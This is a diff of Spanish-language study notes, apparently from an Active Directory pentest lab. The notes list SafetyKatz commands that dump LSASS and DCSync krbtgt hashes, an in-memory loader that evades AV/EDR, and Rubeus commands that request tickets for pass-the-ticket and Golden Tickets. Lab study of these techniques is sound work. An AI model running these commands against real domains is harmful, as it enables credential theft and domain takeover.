@@ -11,12 +11,14 @@ Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz
 ## SafetyKatz
 
 ```powershell 
+! Usuario: Domain Admin o cuenta con privilegio SeDebugPrivilege / acceso a LSASS
+
 ❯ .\SafetyKatz.exe "lsadump::lsa /patch"
 # Ejecuta SafetyKatz (versión ofuscada de mimikatz) para volcar los hashes NTLM de todas las cuentas del dominio desde LSASS vía el módulo LSA — equivalente a sekurlsa::logonpasswords pero apuntando directo al proceso LSA con patch en memoria.
 
 ❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 # Carga SafetyKatz en memoria desde un servidor HTTP local vía Loader.exe (evasión de disco) y ejecuta lsadump::evasive-lsa /patch para volcar hashes NTLM — variante evasiva que evita tocar disco y reduce detección por AV/EDR
- 
+
 ❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 # Ejecuta un ataque DCSync para obtener el hash NTLM de la cuenta krbtgt — simula el comportamiento de un DC para replicar credenciales sin necesidad de ejecutar código en el DC. Base para crear Golden Tickets.
 ```
@@ -24,6 +26,8 @@ Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz
 ## Rubeus 
 
 ```powershell
+! Usuario: Domain Admin (requiere hash AES256 de krbtgt y SID del dominio)
+
 ❯ .\Rubeus.exe asktgt /user:svcadmin /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 # Solicita un TGT para svcadmin usando su clave AES256 (más sigiloso que RC4/NTLM), crea un proceso cmd.exe en modo sacrificio (/createnetonly) para inyectar el ticket sin contaminar la sesión actual, y lo muestra — enfoque OPSEC-friendly para movimiento lateral.
 
@@ -76,8 +80,6 @@ Notes:
 	❯ set computername
 	# Verifica que la máquina remota es efectivamente el DC (dcorp-dc).
 ```
-
-[![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
+![Golden-Ticket-Rubeus.png | 900](https://i.postimg.cc/TwC7VQBy/Golden-Ticket-Rubeus.png)](https://postimg.cc/WFqwjmNj)
 [![Golden-Ticket-Rubeus2.png | 900 ](https://i.postimg.cc/0jjtcDqV/Golden-Ticket-Rubeus2.png)](https://postimg.cc/p5NYd9rj)
-
-[![Golden-Ticket.png](https://i.postimg.cc/6pM86Jv4/Golden-Ticket.png)](https://postimg.cc/5XF4prpf)
+![Golden-Ticket.png](https://i.postimg.cc/6pM86Jv4/Golden-Ticket.png)](https://postimg.cc/5XF4prpf)
